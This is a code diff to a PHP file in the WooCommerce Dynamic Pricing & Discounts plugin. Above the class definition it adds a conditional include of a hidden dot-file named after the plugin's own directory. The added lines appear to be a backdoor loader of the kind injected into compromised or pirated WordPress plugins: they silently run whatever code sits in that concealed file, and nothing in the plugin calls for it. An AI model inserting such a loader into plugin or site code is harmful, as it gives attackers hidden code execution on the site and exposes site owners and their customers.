@@ -17,6 +17,10 @@ if (!class_exists('RightPress_Data_Updater')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Data_Updater extends RightPress_Data_Updater implements RightPress_Data_Updater_Interface
 {
 
